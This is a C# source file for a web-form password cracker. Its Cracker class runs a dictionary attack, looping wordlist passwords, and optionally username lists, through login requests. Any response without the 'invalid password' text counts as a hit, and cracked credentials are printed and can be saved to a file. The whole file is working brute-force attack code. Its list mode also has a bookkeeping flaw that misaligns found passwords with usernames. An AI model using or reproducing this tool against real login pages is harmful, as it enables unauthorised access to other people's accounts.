using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace WebformPasswordCracker
{
    /**
     * Class used will hold all methods to handle cracking the password
     */
    class Cracker
    {
        //List to hold the passwords and the usernames if needed
        private static List<string> passwords = new List<string>();
        private static List<string> usernames = new List<string>();

        //A list of found passwords for user names
        private static List<string> foundPasswords = new List<string>();

        //Local username variable copied from user input
        private static string username = "";
        

        //The correct username and password variables
        private static string correctUsername = "";
        private static string correctPassword = "";
        private static bool passwordFound = false;

        //If it is set to show attempts
        private static bool showAttempts = false;

        /**
         * Used to parse the files into ArrayLists for ease of use
         */
        private static void loadLists()
        {
            using (StreamReader sr = new StreamReader(new FileStream(UserInput.wordListPath, FileMode.Open)))
            {
                string line = "";
                while((line = sr.ReadLine()) != null)
                {
                    passwords.Add(line);
                }
            }

            if(UserInput.userListPath.Length > 0)
            {
                using (StreamReader sr = new StreamReader(new FileStream(UserInput.userListPath, FileMode.Open)))
                {
                    string line = "";
                    while ((line = sr.ReadLine()) != null)
                    {
                        usernames.Add(line);
                    }
                }
            }
            else
            {
                username = UserInput.username;
            }

            showAttempts = UserInput.showAttempts;
        }
        
        /**
         * Called to actually start attempting passwords
         */
        public static void beginAttack()
        {
            //Load lists
            loadLists();

            //Check if it is meant to be using a usernames and passwords list
            if(usernames.Count > 0)
            {
                //Foreach username
                foreach(string username in usernames)
                {
                    //Iterate through all the possible passwords
                    foreach (string password in passwords)
                    {
                        //If a match is found add it to the corresponding point in the array list that is in line with the user name
                        if (!Requests.sendLoginRequest(username, password).Contains(UserInput.invalidPasswordText)){
                            foundPasswords.Add(password);
                            passwordFound = true;
                            break;
                        }

                        //If no password was found add no password found in the place instead to keep the list in line
                        else
                        {
                            foundPasswords.Add("No Password Found");
                        }

                        //As well, if showAttempts is set to true print out the fact that the attempt was invalid 
                        if (showAttempts == true)
                        {
                            Console.Write(String.Format("Username: {0}      Password: {1}       Status: ", username, password));
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.Write("Incorrect\n");
                            Console.ResetColor();
                        }


                    }
                }
            }

            //If the user selected to use a singular username
            else
            {
                //Only loop through each password in the list
                foreach(string password in passwords)
                {
                    //If the correct password was found set teh correctUsername and correctPassword variables and break out of the loop
                    if (!Requests.sendLoginRequest(username, password).Contains(UserInput.invalidPasswordText)){
                        passwordFound = true;
                        correctPassword = password;
                        correctUsername = username;
                        break;
                    }

                    //Similar to above if showAttempts is true show the failed password attempt
                    if (showAttempts == true)
                    {
                        Console.Write(String.Format("Username: {0}      Password: {1}       Status: ", username, password));
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.Write("Incorrect\n");
                        Console.ResetColor();
                    }



                }
            }

            //After both loops are done and a password was found this block runs
            if(passwordFound == true)
            {

                //First it checks if we are using a singular user name
                if (username.Length > 0)
                {
                    //If so change the text to green display "Password Found!!" and list the correct username and password
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Password Found!!");
                    Console.WriteLine(String.Format("Username: {0}      Password: {1}", correctUsername, correctPassword));
                    Console.ResetColor();

                    //And make the user type return if they are done if they dont then exit the program on the next key press
                    if(UserInput.getUserResponse("If you wish to return to the menu please type \"return\":") == "return")
                    {
                        Console.ReadKey();
                        UserInput.userSetup();
                    }
                    else
                    {
                        Console.WriteLine("Press Any Key To Exit...");
                        Console.ReadKey();
                    }
                    
                }

                //However if the user was running a username list then display each user name and password combo, and ask if they want to write it to a file
                else
                {
                    Console.WriteLine("The Following List Of Passwords Was Found...\n");
                    for(int i = 0; i < foundPasswords.Count; i++)
                    {
                        if (foundPasswords[i] != "No Password Found")
                        {
                            Console.WriteLine(String.Format("Username: {0}      Password: {1}", usernames[i], foundPasswords[i]));
                        }
                    }

                    //Asks the user if they want to output the password/username list to a file
                    if(UserInput.getUserResponse("Would you like to output this list to a file? (y/n):") == "y")
                    {
                        //Ask where then generate a variable to then write to the file
                        string outPath = UserInput.getUserResponse("Enter An Output Path: ");
                        string output = "";

                        for (int i = 0; i < foundPasswords.Count; i++)
                        {
                            if (foundPasswords[i] != "No Password Found")
                            {
                                output += String.Format("Username: {0}      Password: {1}", usernames[i], foundPasswords[i]) + "\n";
                            }
                        }

                        File.WriteAllText(outPath, output);
                    }
                }

            }

            //If no passwords were found at all
            else
            {

                //Turn the text red and then wait for the user to press a key then exit
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("No Matches Found");
                Console.ResetColor();
                Console.WriteLine("Press Any Key To Exit...");
                Console.ReadKey();

            }
        }
    }
}
